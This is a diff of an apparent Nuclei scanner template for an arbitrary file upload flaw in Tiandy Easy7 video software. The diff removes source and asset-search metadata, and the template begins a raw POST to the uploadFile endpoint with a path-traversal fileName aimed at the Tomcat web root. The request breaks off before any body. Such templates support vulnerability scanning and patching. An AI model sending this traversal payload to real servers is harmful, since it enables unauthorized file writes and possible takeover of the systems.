@@ -3,12 +3,8 @@ info:
   name: 天地伟业Easy7 uploadFile存在任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ssdryfyfxhfhiuvd'
+  description: ''
   tags: file-upload,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ssdryfyfxhfhiuvd
-    fofa: app="Tiandy-Easy7"
 http:
 - raw:
   - 'POST /Easy7/rest/file/uploadFile?fileName=../../apache-tomcat-7.0.78/webapps/Easy7/DudeSuite HTTP/1.1
